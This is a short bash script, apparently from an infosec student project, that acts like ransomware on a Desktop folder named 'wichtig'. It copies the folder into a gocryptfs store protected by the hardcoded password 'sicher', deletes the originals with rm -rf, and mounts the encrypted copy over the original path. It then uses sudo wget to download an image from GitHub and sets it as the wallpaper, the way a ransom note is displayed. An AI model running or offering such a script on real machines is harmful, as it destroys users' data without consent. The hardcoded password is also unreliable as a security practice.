#!/bin/bash

ORIGINAL_DIR="/home/admin/Desktop/wichtig"
ENCRYPTED_DIR="/home/admin/Desktop/.wichtig_encrypted"
TEMP_MOUNT="/tmp/wichtig_temp"
PASSWORD="sicher"

mkdir -p "$ENCRYPTED_DIR"
gocryptfs -init -extpass "echo $PASSWORD" "$ENCRYPTED_DIR"

mkdir -p "$TEMP_MOUNT"
gocryptfs -extpass "echo $PASSWORD" "$ENCRYPTED_DIR" "$TEMP_MOUNT"
cp -r "$ORIGINAL_DIR"/* "$TEMP_MOUNT"/
fusermount -u "$TEMP_MOUNT"
rmdir "$TEMP_MOUNT"

rm -rf "$ORIGINAL_DIR"
mkdir -p "$ORIGINAL_DIR"
gocryptfs -extpass "echo $PASSWORD" "$ENCRYPTED_DIR" "$ORIGINAL_DIR"

sudo wget https://raw.githubusercontent.com/halbseiden/infosec-projekt2/refs/heads/main/data/Screen.png
pcmanfm --set-wallpaper Screen.png
exit
